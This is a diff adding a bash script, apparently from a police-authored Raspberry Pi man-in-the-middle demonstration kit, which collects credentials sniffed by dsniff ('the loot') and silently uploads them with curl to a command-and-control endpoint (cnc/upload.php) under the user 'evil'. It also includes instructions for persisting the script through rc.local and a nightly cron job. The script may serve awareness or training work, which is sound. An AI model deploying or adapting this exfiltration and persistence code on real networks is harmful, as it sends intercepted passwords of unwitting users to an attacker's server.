@@ -1,0 +1,52 @@
+#!/usr/bin/env bash
+
+# Usage:       ./upload
+#                or
+#              bash upload
+# Description: Uploas the loot to the c&c server.
+# Author:      Tim Adamek (tim.adamek@polizei.niedersachsen.de)
+# Coauthor:    Patrick Neumann (patrick.neumann@polizei.niedersachsen.de)
+# Platform:    Raspbian GNU/Linux 9.x/10.x
+# Version:     1.03
+# Date:        2019-05-08 (first release: 2013-03-06)
+# License:     GPL3
+# Warranty:    This program is distributed WITHOUT ANY WARRANTY
+
+#=== /etc/rc.local  ============================================================
+# add before starting mitm (without leading hashtags!):
+#/home/pi/bin/upload
+
+#=== CRONTAB (user) ============================================================
+# crontab -e
+
+# add (without leading hashtag!):
+#0 0 * * * /home/pi/bin/upload
+
+#=== CONFIGURATION =============================================================
+readonly USER="evil"
+# Bitte PASS setzen!
+readonly PASS=""
+readonly SERIAL="$( awk '/^Serial/ { gsub( "^0*", "", $NF ); print $NF; }' /proc/cpuinfo )"
+readonly MAC="$( cat /sys/class/net/eth0/address | tr -d ":" )"
+readonly ID="$( printf "${SERIAL}${MAC}" | cksum | awk '{ print $1; }' )"
+readonly FILE="/home/pi/dsniff.txt"
+readonly PROTO="https"
+# Bitte DOMAIN setzen!
+readonly DOMAIN="localhost.localdomain"
+readonly DIR="cnc"
+readonly FILENAME="upload.php"
+
+#-------------------------------------------------------------------------------
+# This is the "real magic" of this script...
+#-------------------------------------------------------------------------------
+if [ -s "${FILE}" ] ; then
+  curl --silent \
+       --connect-timeout 30 \
+       --max-time 240 \
+       --user "${USER}:${PASS}" \
+       --form "id=${ID}" \
+       --form "loot=@${FILE}" \
+       "${PROTO}://${DOMAIN}/${DIR}/${FILENAME}"
+fi
+
+exit 0
